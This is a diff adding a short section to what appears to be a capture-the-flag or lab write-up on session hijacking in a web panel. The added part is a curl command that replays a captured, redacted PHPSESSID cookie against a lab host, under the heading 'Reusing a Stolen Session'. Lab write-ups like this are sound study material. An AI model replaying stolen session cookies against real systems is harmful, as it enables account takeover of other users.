@@ -204,4 +204,11 @@ Three sessions belonging to two users, free1 and free2, are logged into the pane
 
 <img width="2206" height="886" alt="image" src="https://github.com/user-attachments/assets/134a4901-3fe5-4dd2-b8aa-da722ffa784b" />
 
+**Reusing a Stolen Session**  
+
+```console
+user@debian-thm:~$ curl -s -b "PHPSESSID=REDACTED-1" http://192.168.10.1/index.php
+```
+
+
 
